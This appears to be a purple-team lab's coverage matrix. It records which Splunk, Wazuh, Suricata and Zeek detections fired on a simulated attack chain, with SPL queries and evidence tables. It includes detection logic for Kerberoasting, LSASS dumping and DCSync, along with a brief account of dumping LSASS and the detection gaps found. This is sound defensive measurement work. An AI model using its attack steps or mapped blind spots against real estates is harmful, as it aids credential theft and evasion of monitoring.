# v4 Coverage Matrix — before/after detection verdicts

The artefact v4 exists to produce. One column per state of the estate: the un-hardened
before-run, one per hardening bundle, and the full after-run. Built incrementally as each
measurement happens, never written at the end — a before/after table assembled afterwards
proves nothing, which is the whole argument of [the v4 plan](README.md).

**Every cell carries the SPL that produced it and the raw result.** A verdict without the query
behind it cannot be checked by a reader or by me, and this lab has already recorded two cells
that were reasoned about rather than run and turned out wrong. The cost of the extra lines is
the point of them.

## Marks

| Mark | Meaning |
| ---- | ------- |
| **M** | Measured — the phase ran against this state and the result was recorded |
| **→** | Carried forward; not re-measured against this state |
| **✓ fires** | The shipped rule returns at least one row for the attack |
| **✗ silent** | The attack ran and the shipped rule returns nothing |
| **N/E** | Not executable — the phase was not run, so there is no verdict to give |
| **⊘ blocked** | A control prevented the attack, and the prevention left **no telemetry to detect** |

`⊘ blocked` was added on 9 November, forced by the first hardening measurement that produced it,
and it exists because the other three marks cannot express a hardening success. See
[the bundle 2 measurement](#bundle-2-measured-9-nov-2026--lsa-protection-blocks-the-attack-and-erases-the-evidence):
after LSA Protection, a credential dump fails and Sysmon records nothing that differs from idle
polling. Written as `✗ silent` that reads as a detection regression; written as `N/E` it claims
the phase was not run. **It is neither — the attack ran and lost**, and a before/after table with
no mark for that will score every effective control as a coverage loss.

`✗ silent` and `N/E` are kept apart deliberately. Silent is a finding about the rule; N/E is a
gap in the run. Collapsing them would let an unrun phase read as a working detection.

**How a verdict is obtained.** By re-running the shipped search verbatim over a window that
contains the attack — not by reading triggered-alert history. Two of the fifteen attack-facing
searches ship with `enableSched = 0` and never run on a schedule at all, so for those an absent
alert carries no information. Where the search as run differs from `savedsearches.conf` in any
way, the difference is stated in the cell.

That rule is strict on purpose, because a near-miss version of a search answers a different
question. This column has now produced four instances of it, across two independent passes, and
they are worth listing together because the shape repeats:

| Where | The mistake | What it would have claimed |
| ----- | ----------- | -------------------------- |
| `#2` | the shipped OneDrive allowlist clause omitted | every OneDrive row as a finding |
| `#15` | a per-flow filter in place of the rule's 10-minute sum | a firing row read as "below threshold" |
| Suricata, exfil | grouped by `alert.signature`, null for `flow`/`http` | "Suricata is blind to the exfil" |
| `60104` noise floor | grouped by `targetUserName`, null for 744 of 764 events | the attack's own `4771`s read as the benign floor |
| fired-alert history | `\| rest /services/` instead of `/servicesNS/-/-/` | "the undocumented rule has never fired" — it fired 28 times |

The first two were caught by re-running verbatim, the third by its author, the fourth by the row
counts not adding up against an earlier timechart, the fifth by an audit-log query asked for a
different reason. **The fourth is the instructive case**,
because an empty result makes a reader suspicious and a *partial* one does not — it came back
with twenty plausible rows and nothing about it looked wrong. Had the hourly totals not already
been on record, the estate's benign audit-failure floor would have been written down as failed
Kerberos authentication, which is exactly backwards: those twenty rows were the attack.

So: **an empty result is a claim about a query until a control proves it is a claim about the
world — and a partial result is the same claim wearing better clothes.**

**Which version of the rules this column was measured against.** A verdict is only meaningful
against a named rule text, and in this lab the repo and the running instance are not the same
thing: the Splunk host has no outbound internet, so
[the app is deployed there by hand](../detections/README.md) rather than pulled. The timeline
that applies to every cell above:

| When | What changed |
| ---- | ------------ |
| 31 Oct | `renderXml=1` on all three Windows hosts — Sysmon `source` moves `WinEventLog:` → `XmlWinEventLog:` |
| 3 Nov | `485811a` adds the C2 OneDrive allowlist, the `tstark` etype allowlist, the telemetry exclusions and the IPv6 branch on Large Outbound |
| 3 Nov | that package deployed to the live Splunk instance; `\| rest` reads back 18 searches, 15 scheduled |
| 6 Nov | this column measured |

So every cell here was measured against the post-3-November rule text, allowlists included —
which is why `#4`'s allowlist could be observed not suppressing the attack, and why `#2`'s
OneDrive allowlist was in force and still had a gap. A measurement taken against the pre-`485811a`
text would be answering a different question and is not comparable to these.

The distinction that matters more than the version is **deployed search versus ad-hoc SPL.**
Every cell above was run as ad-hoc SPL copied from `savedsearches.conf` at `HEAD`, not by
triggering the deployed saved search, and the two can diverge if the host's app is behind the
repo. They are not known to diverge here, and that was checked rather than assumed: the 3 November
deployment packaged `485811a`, and `git diff 485811a..HEAD` on `savedsearches.conf` returns three
changed lines, all of them `description =` text about what the 20 October screenshots preserve.
No `search =` line differs, so the query text run ad-hoc at `HEAD` is the query text deployed on
the host. A first draft of this paragraph claimed the file had not changed at all, which the diff
contradicted — the claim that survives is narrower and is the one that matters.

**Clock.** Splunk `_time` is CET and equals the time the attack happened, which two independent
checks fix: the IPv4 exfil's own server response carries `Date: 16:27:16 GMT` against a Splunk
`_time` of `17:27:09`, exactly +1h, and the `4740` lockout at `_time 11:32:05` matches the second
`kerbrute bruteuser` reported the account locked. The `+1h` discrepancy noted during the benign
baseline is in the DC's rendering inside the event body, not in `_time`; timestamps in this
matrix need no adjustment.

## Before-run — un-hardened baseline, 6 Nov 2026

Chain executed 6 November, roughly 11:03 to 17:06 CET. Fifteen attack-facing searches; the
three pipeline-health searches are not detection cells and are not listed.

| # | Rule | Phase | Before | Mark |
| - | ---- | ----- | ------ | ---- |
| 1 | LOLBin Execution (CIM tstats) | 3 | N/E | — |
| 2 | C2 Beacon from User-Writable Path | 5b | **✓ fires on both hosts — and one allowlist gap** | M |
| 3 | Kerberoasting RC4 Service Ticket | 4a | **✗ silent — by design, the roast was AES** | M |
| 4 | Kerberoasting User-SPN (etype-agnostic) | 4a | **✓ fires** | M |
| 5 | Password Spray (multi-user from one source) | 2 | **✗ silent — one account below threshold** | M |
| 6 | Spray Success (4771 then 4768 same source) | 2 | **✓ fires — and one false positive** | M |
| 7 | SAM Hive Dump via reg save | 9b | N/E | — |
| 8 | DCSync from non-DC | 9c | N/E — **and its input does not exist**, see below | — |
| 9 | Scheduled Task Persistence | 10 | **✓ fires — 1 of 1, no false positives** | M |
| 10 | LSASS Access (credential theft mask) | 8 | **✓ fires** | M |
| 11 | Kerbrute User Enumeration (4768 error 0x6) | 1 | **✗ silent — structural** | M |
| 12 | Verify Account Lockout (post FGPP) | 2 | **✓ fires, output unusable** | M |
| 13 | RC4 Anomaly (post AES enforcement) | 4a | **✗ silent — nothing to anomaly on yet** | M |
| 14 | Sliver C2 Beacon by JA4 Fingerprint | 5a | **✓ fires on one of two hosts** | M |
| 15 | Large Outbound Transfer | 11, 12 | **✓ fires on both exfils — and one false positive** | M |

Two phases ran and have **no Splunk row at all**, because no Splunk search covers them. Both are
measured below:

| Phase | Shipped coverage | Before |
| ----- | ---------------- | ------ |
| 6 — Pass-the-Ticket | **none, in any layer** | attack confirmed; nothing alerts |
| 7 — WinRM lateral movement | Sigma only, [`v3_ndr.yml`](../detections/sigma/v3_ndr.yml) | logic matches 6 of 7 connections; **not deployed, nothing alerts** |

**Phase 7's wording was corrected.** An earlier version of this table read "✓ fires on 6 of 7
connections", which is wrong in a way worth keeping visible. The WinRM rule is Sigma — portable
rule content — with no corresponding saved search in the Splunk app, and
[the week's alert history](#the-alert-history-which-this-column-should-have-read-first) contains
no WinRM entry. What was measured is the rule's logic matching the data, by translating it to SPL
by hand. Nothing on this estate would have alerted. Those two readings look identical in a
coverage table and are not the same thing.

**The column is complete: twelve measured, three N/E.** Seven fire, five are silent.

The split that matters is not fires-versus-silent. It is that **four of the seven that fire are
defective in ways a tick in this column would hide**:

| Rule | Fires on the attack, and also… |
| ---- | ------------------------------ |
| `#6` Spray Success | benign clock skew, ninety minutes before the chain |
| `#12` Verify Account Lockout | cannot say which account was locked — both output columns empty |
| `#2` C2 Beacon | `OneDrive\Update\OneDriveSetup.exe`, an allowlist gap |
| `#15` Large Outbound | 12.5 MB of ordinary Microsoft HTTPS, on a placeholder threshold |

Of the five silent, three are silent for reasons that are correct or by design (`#3`, `#11`,
`#13`), one is silent by a single account (`#5`), and **none are silent because the rule is
wrong.** That is the opposite of the v3 result, where rules failed by being wrong; here they
fail by being imprecise, which is harder to see and is why every cell carries its query.

**This table is Splunk alone, and one of its verdicts does not survive that.** `#5` reads
`✗ silent`, which is true of the rule and false as a statement about the estate: Wazuh detects
that spray. [The other three layers](#the-other-three-layers-measured-6-nov-2026) are measured
below for the phases this pass covered, and they also close `#11` as a four-layer gap rather than
a two-layer one. Read the two tables together; either alone misleads in a different direction.

Three cells are N/E by decision rather than by accident. A phase runs in the before-run only if
a shipped rule measures it **and** the after-run will run it too; dropping a phase from one
column alone would make the comparison asymmetric, so it is dropped from both. Phases 3 and 9b
were not executed. Phase 9c was attempted in an earlier run and failed at RPC 1825, and
repairing it mid-measurement would change the estate between columns.

> **Measured, 9 Nov 2026 — `#8`'s input has never existed, which is a second and independent
> reason that cell is empty.** The rule was recorded as `N/E` because the attack failed at
> RPC 1825. Checking the audit configuration before bundle 1 turned up the other half.
>
> `Purple - DCSync from non-DC` reads `EventCode=4662` and requires `Properties` to contain one
> of three replication control-access GUIDs. Those are written by the **Directory Service Access**
> subcategory, and `auditpol /get /category:*` shows it **disabled on all three hosts**.
>
> `4662` events do exist — 887 on HYDRA-DC, 512 on SPIDERMAN, 254 on THEPUNISHER over seven days,
> the most recent minutes old. None of them is the right kind:
>
> | Host | With a replication GUID | Object types actually seen |
> | ---- | ----------------------- | -------------------------- |
> | HYDRA-DC | **0** | `WMI Namespace` |
> | SPIDERMAN | **0** | `WMI Namespace`, `SecretObject` |
> | THEPUNISHER | **0** | `WMI Namespace`, `SecretObject` |
>
> WMI object access and LSA secret access — monitoring-agent traffic, the same class of
> background noise as the `4674` floor in `#5`. The rule's filter can never match them.
>
> **So this is a high-fidelity rule, scheduled, enabled, marked "always investigate", whose input
> stream has been empty for its whole life** — the v3 Wazuh pattern a third time, found a third
> way. And the benign baseline's row for it reads `0 alerts | 778 × 4662 | threshold measured`,
> which is the trap: 778 is a real count of a real event code and it looked like the benign volume
> the rule sits on. It is not the rule's input. **A measured number that looks like coverage and
> is not** — exactly the failure mode catalogued in the method section above, this time from an
> event-content mismatch rather than a query mistake.
>
> **This gives bundle 1 the only concrete capability change in it.** Enabling
> `Directory Service Access` with a SACL on the domain naming context is what makes `#8`'s input
> exist for the first time. The cell stays `N/E` afterwards — the attack still fails at RPC 1825 —
> but it moves from *"untestable because nothing is logged"* to *"untestable because the attack
> does not work"*, and those are different gaps with different fixes.

## The alert history, which this column should have read first

Every cell above was measured by re-running a search. That was the right method and it was not
the only one available: the scheduled rules track their own triggered alerts, and nobody had
looked.

```spl
index=_audit action=alert_fired earliest=-7d latest=now
| stats count min(_time) as first max(_time) as last by ss_name
| sort -count
```

| `ss_name` | fired | first | last |
| --------- | ----- | ----- | ---- |
| **`Kerberoasting Detection - TGS Source Anomaly`** | **28** | 31 Oct 14:00 | 7 Nov 01:00 |
| `Purple - Spray Success` | **2** | 6 Nov 09:40 | 6 Nov 11:40 |
| `Purple - C2 Beacon from User-Writable Path` | 1 | 6 Nov 12:10 | — |
| `Purple - Kerberoasting User-SPN Ticket` | 1 | 6 Nov 11:50 | — |
| `Purple - LSASS Access` | 1 | 6 Nov 17:10 | — |
| `Purple - Scheduled Task Persistence` | 1 | 6 Nov 17:20 | — |
| `Purple - Sliver C2 Beacon by JA4 Fingerprint` | 1 | 6 Nov 12:10 | — |
| `Purple - Wazuh Sensor Health` | 1 | 6 Nov 09:08 | — |

**It confirms the column independently.** Five attack cells recorded as `✓ fires` have a triggered
alert in the next scheduling cycle after the attack: the roast at 11:48 and `#4` at 11:50, the
beacon window 12:04–12:09 and both C2 rules at 12:10, the LSASS read at 17:06 and `#10` at 17:10,
the task at 17:19 and `#9` at 17:20. Nothing contradicts a verdict reached by re-running, which
is worth having — the two methods could have disagreed and did not. `Purple - Wazuh Sensor Health`
firing once at 09:08 is the estate coming up, which is correct behaviour for it.

**`Purple - Spray Success` fired twice, and the second one is the false positive.** 11:40 is the
attack. **09:40 is the clock-skew row** recorded in `#6` — SPIDERMAN, `0x25` failures plus
successful TGTs inside ten minutes. So that false positive is not a shape the rule *could*
mistake, which is how `#6` describes it. **It was delivered.** This estate sent an analyst a spray
alert for ordinary authentication that failed on time drift.

**And the loudest rule on this instance is not in this repository.**
`Kerberoasting Detection - TGS Source Anomaly` fired 28 times in seven days — more than every
documented rule combined, which managed eight. It is owned by `admin` and shared `user`, so it
lives in a private namespace and appears in no inventory taken from the admin account. It is not
in `purple_lab`, not in `savedsearches.conf`, and not in this matrix.

### The undocumented rule, measured

```
index=* EventCode=4769
| eval src=replace(Client_Address, "::ffff:", "")
| where NOT match(Service_Name, "\$$") AND Service_Name!="krbtgt" AND src!="::1"
| lookup userhost Account_Name OUTPUT expected_ip
| lookup enc_types enc_code AS Ticket_Encryption_Type OUTPUT enc_name, risk
| eval anomaly=if(isnull(expected_ip), "NOT IN LOOKUP", if(src!=expected_ip, "HIGH", "OK"))
| where anomaly!="OK"
```

Hourly, enabled, `alert_threshold = 0` with `greater than` so any row fires, `alert.track` on,
`actions` empty.

**Its approach is better than `#4`'s in one real way.** `#4` carries its allowlist in the search
text as a hard-coded principal, SPN and two addresses. This one uses a lookup mapping accounts to
expected source hosts, so it generalises past three users and needs no edit to add one. That is
arguably the design `#4` should have had.

**And three properties together make it worse than no rule.** The `NOT IN LOOKUP` branch fires on
every account the table does not cover, so its alert volume is a function of a lookup's
completeness rather than of anything an attacker did. The threshold of zero means one row
triggers. And `actions` is empty, so twenty-eight firings went into a list and notified nobody.

That is the v3 Wazuh pattern exactly — *it loaded, reported as coverage, and was discarded* — with
the difference that this one has a measurable history, and the history says it has been firing
every few hours for a week while being invisible to every inventory.

**Two dependencies outside version control.** It needs the `userhost` and `enc_types` lookups,
which exist on the instance and nowhere in this repository. Transcribed into the app it would not
run, and nothing in the repo records that those tables are part of this estate's detection logic.

### What else is on the instance

```spl
| rest /servicesNS/-/-/saved/searches splunk_server=local
| search eai:acl.app="search" NOT eai:acl.owner="nobody"
| table title eai:acl.owner eai:acl.sharing disabled is_scheduled cron_schedule
```

Twenty-three saved searches outside `purple_lab`, named like detections —
`LSASS Access — notepad.exe injection`, `C2 Injection — Sliver notepad.exe`,
`Sliver C2 — JA4 Fingerprint Detection`, `V3 - Kerberoasting SQLService` among them. Their state:

| State | Count | Effect |
| ----- | ----- | ------ |
| enabled **and** scheduled | **1** | runs — the rule above |
| scheduled but `disabled=1` | 6 | never runs |
| enabled but `is_scheduled=0` | 16 | saved queries, not detections |

**An inventory that counted titles would report 38 detections where 16 run.** Twenty-two are
inert and several duplicate shipped rules by name, which is the trap: the names are the names of
real detections, and reading the list tells you nothing about whether anything fires.

**This resolves a worry rather than creating one.** `LSASS Access — notepad.exe injection` and
`C2 Injection — Sliver notepad.exe` match what `#10` measured exactly, and had either been
scheduled, a cell recorded as "fires via `#10`" could have been firing from somewhere
undocumented. Neither is scheduled. The cells stand.

**What does not stand is this matrix's scope sentence.** It was built from the shipped app, and
"the fifteen attack-facing searches" is true of `purple_lab` and false of the estate. Sixteen
scheduled detections run here, one of them undocumented and by far the noisiest.

### And the same trap caught this measurement

`| rest /services/alerts/fired_alerts` returned **zero rows** for the undocumented rule while
`_audit` showed twenty-eight firings. `/services/` resolves in the current user's namespace and
the rule is in another user's private one. The `/servicesNS/-/-/` form used for `saved/searches`
above was the correct one and was not used here.

This is the [v3 `| rest` finding](../detections/README.md) — *an inventory that changes with the
login is not an inventory* — reproduced a third time, during the investigation of itself, by
someone who had just written it down. The lesson is not that the trap exists. It is that knowing
about it does not prevent walking into it, which is the argument for controls rather than care.

**Re-run with the namespace wildcard, the two counters reconcile:**

| Source | Kerberoasting rule | `purple_lab` rules | Total |
| ------ | ------------------ | ------------------ | ----- |
| `_audit action=alert_fired`, 7 days | 28 | 8 | 36 |
| `/servicesNS/-/-/alerts/fired_alerts` | 9 | 8 | 17 |

The gap is retention, not disagreement: `fired_alerts` lists triggered alerts that have not yet
expired, `_audit` logs the event. The eight `purple_lab` firings are all from 6 November and all
still listed; nineteen of the Kerberoasting rule's twenty-eight have aged out, which is itself a
measure of how long it has been firing.

**And one row in that endpoint nearly became a sixth bad reading.** It returns an entry with
`title` of `-`, no owner, no app, and `triggered_alert_count = 17` — the largest number in the
table. It is the aggregate, not an unnamed rule: `9 + 2 + (6 × 1) = 17`. The arithmetic is what
established that, and without it "a nameless rule fired seventeen times" would have been the
natural reading of a row that looks exactly like the others.

## Control re-run after bundle 1, 9 Nov 2026 — and a rule that matches without firing

Bundle 1 was applied and two phases re-run against it as a procedural control. The reasoning for
doing that is in [the plan](README.md): audit policy moves no verdict, so any cell that moves
indicts the measurement procedure rather than the estate.

Inputs were identical — the same 58-name wordlist and the same 7-account spray list, both
recovered from the attacker host and line-counted before use.

| | 6 Nov | 9 Nov, post-bundle |
| --- | ----- | ------------------ |
| Enum: rule rows | 0 | **0** |
| Enum: `4768` result codes | `0x0` only | **`0x0` only** |
| Enum: Zeek unknown principals | 57 | **57** |
| Spray: rule rows | 0 | **0** |
| Spray: `0x18` accounts from `.133` | 4 | **3** |
| Spray: `0x18` events | 14 | **6** |
| Spray: Zeek distinct principals | 8 | **7** |

**The enum reproduces exactly. The spray reproduces with a predicted difference, and the
arithmetic closes.** Today's run omitted the `bruteuser` attack against `tstark` that followed
the spray by 4.5 seconds on 6 November. Remove it and the numbers fall out: 14 − 8 = 6 events,
4 − 1 = 3 accounts, 8 − 1 = 7 principals on the wire.

So [CASE-01](investigations/CASE-01-password-spray-undercount.md)'s central claim is confirmed by
independent re-measurement: **the fourth account was never the spray's.** Measured alone, the
spray yields three.

### Wazuh did not fire this time, and that reverses a conclusion

6 November: `60205` fired twice, at level 10, on 16 audit failures inside six seconds.
9 November: six audit failures, and **`60205` did not fire.** Its frequency threshold sits
somewhere between the two.

`CASE-01` and the layer table above both record that Wazuh detected this spray where the Splunk
rule did not, and present that as the phase being covered after all. **Measured in isolation, it
is not.** What Wazuh detected on 6 November was the spray *plus* `bruteuser` — the same adjacent
attack that inflated the Splunk account count. Strip it and the spray alone is detected by
nothing: Splunk needs five accounts and has three, Wazuh needs a bigger burst than six.

Both layers were credited with a coverage they only had because two attacks landed in the same
few seconds. That is the control re-run earning its cost.

### `#6` matched, and no alert was delivered

The sharper finding. `Purple - Spray Success` returns a row for today's spray when run by hand —
`192.168.182.133`, four accounts, `eventcount=7`, at 16:34:47. The scheduled search ran twice
afterwards and succeeded both times. No alert appears in the audit log.

The scheduler says why, in one line:

```
result_count=1, alert_actions="", suppressed=1, fired=0, skipped=1
```

**Matched, throttled, never delivered — and no action configured even if it had been.**

**What armed the throttle is the finding, and it is not what it first looked like.** This rule's
last recorded firing was 6 November at 11:40 — three days earlier, well past a 24-hour
suppression period. So something fired it again, and the audit log has it at **14:50:46 today**:
two hours *before* the spray, on an estate reverted to a clean snapshot an hour earlier, with no
attack in between.

The search ID resolves it. That execution carries `…_at_1794013200_…`, a scheduled slot of
**7 November 02:00**, and because the alert fired its dispatch artifact survives — so what it
returned can be read back with `| loadjob` rather than reconstructed. Both rows are dated
**6 November**: the before-run's spray at 11:32, and the clock-skew false positive at 09:29.

So the rule replayed a three-day-old window, delivered two stale alerts — one true positive, one
false — armed its 24-hour throttle, and the real spray two hours later was suppressed.
`Purple - LSASS Access` fired in the same millisecond off its own stale window.

**The cause is not established, and the setting that should prevent it is on.**
`realtime_schedule = 1` is the effective value from Splunk's system defaults, and under it the
scheduler should skip missed slots rather than execute them. That makes the finding worse rather
than better: a backfill that was switched on would be a configuration mistake with an obvious
fix, while this is behaviour the configuration says should not occur.

Written up as [CASE-09](investigations/CASE-09-a-stale-alert-suppressed-a-live-one.md).

**And a correction to this cell's first reading.** The throttle key is `Client_Address` while the
search's final line is `| table _time src Account_Name eventcount` — renamed to `src` by an
`eval`, so the key is empty and one global entry throttles every source rather than one per
attacker. That defect is real and still owed. **It is not the cause here:** the 6 November spray
and today's both came from `192.168.182.133`, so a correctly keyed throttle would have matched
and suppressed the live attack identically. Attributing it to the key would have been a tidy
wrong answer.

**What this does to the column.** The matrix's verdicts are all obtained by re-running the
shipped search, which is [stated as the method](#marks) and remains correct: `#6`'s search
matches, today and on 6 November. What is weaker than written is
[CASE-07](investigations/CASE-07-the-loudest-rule-is-not-in-the-repo.md)'s section arguing that
the alert history independently confirms this column. It confirmed one instance. The same rule,
on the same shape of data, delivered nothing today.

So the honest reading of `#6` is **the search fires and the alert does not**, which is a third
variety of the pattern this column keeps finding — after a rule that fires and notifies nobody,
and content that exists and is not deployed.

## Bundle 2, measured 9 Nov 2026 — LSA Protection blocks the attack and erases the evidence

`RunAsPPL = 1` was applied to **THEPUNISHER only**, deliberately, so that the protected and
unprotected hosts form a pair. After reboot, `wininit` confirms it:
*"LSASS.exe was started as a protected process with level: 4."*

The same action was then performed on both hosts: Task Manager's built-in **Create dump file**
against `lsass.exe`, run elevated.

| Host | LSA Protection | Result | Sysmon `EventCode=10` from `taskmgr.exe` |
| ---- | -------------- | ------ | ----------------------------------------- |
| SPIDERMAN | off | **dump succeeded**, `lsass.DMP` written | `0x1fffff` ×2, plus normal polling |
| THEPUNISHER | **on** | *"The operation could not be completed. Access is denied."* | **`0x1000` only**, 95 events — nothing else |

**The control works and the evidence disappears with it.** On the protected host there is no
event carrying a dump-capable mask — not a lower one, not a denied one, nothing. All that remains
is the `0x1000` polling Task Manager performs constantly whether anyone attacks or not.

So after this bundle, `#10` has nothing to fire on, and **its silence is indistinguishable from
an estate where nobody tried.** That is the risk
[the plan named on 7 November](README.md) — *"the attack fails on the protected host; the risk is
that it also goes silent"* — confirmed in its sharpest form: not a mask outside the rule's list,
but no event at all.

### What bundle 2 actually changed

Measured before applying anything, which is the discipline bundle 1 established and which saved
most of the work again. Of six controls in the plan, **three were already in place and one was
deferred:**

| Control | Before | After | Cell |
| ------- | ------ | ----- | ---- |
| `RunAsPPL` | absent, all three hosts | **`1` on THEPUNISHER only** | `#10` → `⊘ blocked` |
| `UseLogonCredential` (WDigest) | absent — modern default is already off | `0`, explicit, all three | none |
| `LmCompatibilityLevel` | absent — default `3` | `5`, all three | none — the chain is Kerberos, and [HUNT-01](hunts/HUNT-01-spray-without-the-4771-count.md) measured zero `4625` |
| `NoLMHash` | **already `1`** | unchanged | — |
| `RestrictAnonymousSAM` | **already `1`** | unchanged | — |
| Protected Users | empty | **deliberately left empty** | deferred — see below |

**Protected Users was deferred on purpose, and the reason is attribution.** Members of that group
cannot use RC4 Kerberos. Adding `SQLService` or `fcastle` would therefore break the
Pass-the-Ticket — which is **bundle 4's clearest prediction**. Done here, bundle 4 loses its best
measurement and a broken PtT after bundle 2 could not be attributed to either control. It goes
with bundle 4 or not at all.

**The one-endpoint split is verified rather than assumed**, because the `⊘ blocked` mark depends
on it: `RunAsPPL` reads `1` on THEPUNISHER and is absent on SPIDERMAN and HYDRA-DC. If it had
spread, the unprotected half of the pair would be gone and the bundle's only measurement with it.

### Which is why this column needed a new mark

Three marks existed: fires, silent, not executable. None of them says *the attack ran and the
control beat it*. Recording this cell as `✗ silent` would read as a detection regression caused
by hardening; recording it as `N/E` would claim the phase was not run. Both are false, and a
matrix that can only say those two things **scores every working control as a loss of coverage.**

`⊘ blocked` is the fourth mark and it carries an obligation: a cell only earns it when the
blocking is *demonstrated*, not assumed. Here the demonstration is the pair — the identical
action on the unprotected host succeeded and produced `0x1fffff`, so the absence on the protected
host is attributable to the control rather than to nobody having tried.

**Without the unprotected half, this measurement would be worthless**, which is the argument for
the one-endpoint split the plan specified and the reason it must survive into the remaining
bundles.

## Defender, the fifth layer nobody counted — measured 9 Nov 2026

The layer table below has four columns: Splunk, Wazuh, Suricata, Zeek. There is a fifth running
on every Windows host in this estate, and it has no cell anywhere in this matrix.

While verifying LSA Protection for bundle 2, an administrator ran Task Manager's built-in
**Create dump file** against `lsass.exe` on SPIDERMAN. Microsoft Defender caught it behaviourally
and said so on the console:

```
Behavior:Win32/DumpLsass.C!attk      Severe      9 Nov 2026 20:30      Active
```

**That detection never reached the SIEM**, and the reason is an ingest gap rather than a rule
gap:

```spl
index=main source="WinEventLog:Microsoft-Windows-Windows Defender/Operational" earliest=-7d latest=now
| stats count min(_time) as first max(_time) as last by host
```

| host | events, 7 days |
| ---- | -------------- |
| THEPUNISHER | 187 |
| SPIDERMAN | **0** |
| HYDRA-DC | **0** |

Defender's operational channel is forwarded from **one of three hosts**. The detection happened
on one of the two that do not forward it. And the host that does forward sends only `2001`,
`5007` and `1152` — signature updates and configuration changes. **Not one detection event
(`1116`/`1117`) exists in the index from any host.**

So Defender is detecting credential theft on this estate, correctly and at severity *Severe*, and
the SIEM has never seen it do so.

**This is the v3 Wazuh finding in a new product.** That run recorded *"a Sysmon ingestion gap left
the EDR blind on two of three hosts"*. Here a second EDR is blind to the SIEM on two of three
hosts, found two years of lab-time later, by an action taken for an unrelated reason.

Owed, and not done now: forward `Microsoft-Windows-Windows Defender/Operational` from all three
hosts, and give the matrix a Defender column. Both are additions rather than rule changes, but
adding a detection source mid-measurement changes what the after column can see, so they wait
for step 8.

## The other three layers, measured 6 Nov 2026

The table above is Splunk only. This one is not, and it changes what two of those cells mean.
Measured independently, by a second pass that had the raw evidence and deliberately did **not**
read the column above first — which is the whole reason its disagreements are worth anything.
It covers the phases that pass measured: 1, 2, 4, 11 and 12.

| Phase | Splunk | Wazuh | Suricata | Zeek |
| ----- | ------ | ----- | -------- | ---- |
| 1 enum | ✗ no `0x6` | ✗ silent | `krb5` logging only | ✓ 59 unknown principals |
| 2a/2b spray | ✗ silent (3 of 5) | **✓ `60205` level 10** | `krb5` logging only | ✓ 14 pre-auth fails + 1 success |
| 2c lockout | ✓ fires, output empty | **✓ `60115` level 9** | — | ✓ 5 `CLIENT_REVOKED` |
| 4 roast | ✓ fires | ✗ silent | **✓ `weak_encryption` ×2** | ✓ NDR Kerberoast rule fires |
| 11/12 exfil | ✓ fires | n/a — host EDR sees no byte volume | ✓ visibility, no signature | ✓ `conn.log` |

**The spray cell changes meaning.** `#5` is silent in Splunk because the spray yields three
countable accounts against a threshold of five. Wazuh `60205` — *Multiple Windows audit failure
events* — fires at level 10 on the same minute. **The estate detected the spray; the Splunk rule
did not.** A single-source matrix would have recorded this phase as a miss, and it was not one.

That is the strongest argument in this document for building the matrix from the shipped
detection content rather than from one tool, and it was produced by the layer the column had been
ignoring.

**Two things keep it honest.** `60205` is a *built-in* Wazuh rule, not one of the seven custom
ones, and "multiple audit failures" is generic by construction — it fires on a burst of failures
whatever caused them. So this is coverage by genericity, not precision, and its false-positive
rate in this estate is **unmeasured**: the benign baseline covered the fifteen Splunk searches and
nothing in Wazuh. Until that number exists, the honest claim is that Wazuh saw the spray, not
that Wazuh is a reliable spray detection here.

**The lockout cell gains the field Splunk cannot give it.** `#12` fires and reports two empty
columns. Wazuh `60115` — *User account locked out* — fires at level 9 on the same event. If it
carries the account name, the pairing is the answer to `#12`'s defect without touching the Splunk
rule at all; that is open and listed below.

**Phase 1 gets worse, and more conclusive.** Wazuh is also silent — its built-in authentication
failure rules key on `4771`, which enumeration never produces. So the enum is invisible to
Windows, invisible to Wazuh, visible to Suricata only as `krb5` traffic with no alert, and fully
recorded by Zeek, where no shipped rule acts on it. **Four layers measured, one has the evidence,
none alerts.** The `#11` cell previously asserted that gap from two layers; it is now measured
across all four.

**Phase 4 reproduces a v3 reversal rather than discovering something.** Suricata raises
`applayer/weak_encryption` twice at 11:48:12 on an AES-256 roast. That looks contradictory and is
not: the signature fires on what the client *offers* in negotiation, and `impacket` advertises
RC4 among its supported etypes even when the KDC issues `0x12`. This lab already argued the
opposite and was wrong —
[what `weak_encryption` actually fires on](../v3/README.md#what-weak_encryption-actually-fires-on)
is the v3 write-up of that reversal. It now has an independent reproduction, from a measurement
taken without reference to it.

The practical value is a detection angle the Splunk rules do not have: `#3` keys on the issued
etype and goes silent on an AES roast by design, while Suricata flags the *request*. A roast is
visible at the network layer **regardless of what the KDC issues.**

**The roast converges on three layers inside 140 ms:**

| Layer | Timestamp | What it saw |
| ----- | --------- | ----------- |
| Suricata | 11:48:12.373, .384 | `applayer/weak_encryption` ×2 |
| Zeek | 11:48:12.382 | TGS, `fcastle/MARVEL.LOCAL` → `MARVEL.LOCAL\SQLService` |
| Splunk | 11:48:12.502 | `4768`, `fcastle`, **`0x17`** — the TGT, RC4 |
| Splunk | 11:48:12.513 | `4769`, `SQLService`, `0x12` — the TGS, AES |

The two network sensors sit about 120 ms ahead of the DC's own log, and the DC's two events are
11 ms apart in the order Kerberos requires: ticket-granting ticket, then service ticket. Nothing
here needed correlating by hand — three independent sensors agree on one event to within a
seventh of a second.

**One caveat on reading that ordering too closely.** These are four timestamps from three hosts
with independent clocks, and Zeek writes a `kerberos.log` line when it closes a transaction
rather than when the first packet lands. The convergence inside 140 ms is solid; the internal
sequence across sensors is not evidence on its own. The ordering that *is* evidence is the
11 ms between `4768` and `4769`, because both come from the same host and the same log.

The RC4 TGT in that table is the finding `#13` turns on: the louder cryptographic signal arrived
eleven milliseconds before the ticket that triggered an alert, and no rule read it.

**Incidental: Wazuh independently confirms three things this column already held.** These were
measured blind, by a pass that had not read the cells they corroborate:

| Wazuh rule | Level | Confirms |
| ---------- | ----- | -------- |
| `100200` | 12 | the LSASS read in `#10` |
| `100210` | 12 | the `\Updater` task in `#9` |
| `92203`, `92213` | 6, 15 | the beacon path in `#2`, naming `C:\Temp\GlobalProtect_Update.exe` outright |

`92213` is *executable dropped in a folder commonly used by malware*, at level 15 — the highest
severity anything produced in this run. **And the implant drop has no cell in this matrix**, in
any column, because no Splunk search covers it. Two Wazuh rules caught the loudest event of the
chain and the table above has nowhere to put it. That is the same structural gap as phase 7, found
from the other direction.

**A one-event wire-versus-endpoint gap, measured on both sides.** Zeek records 5
`KDC_ERR_CLIENT_REVOKED` from `.133`. The endpoint holds four, timestamped:

```
11:32:06.001  tstark  .133  0x12
11:32:06.003  tstark  .133  0x12
11:32:06.157  tstark  .133  0x12
11:32:06.161  tstark  .133  0x12
```

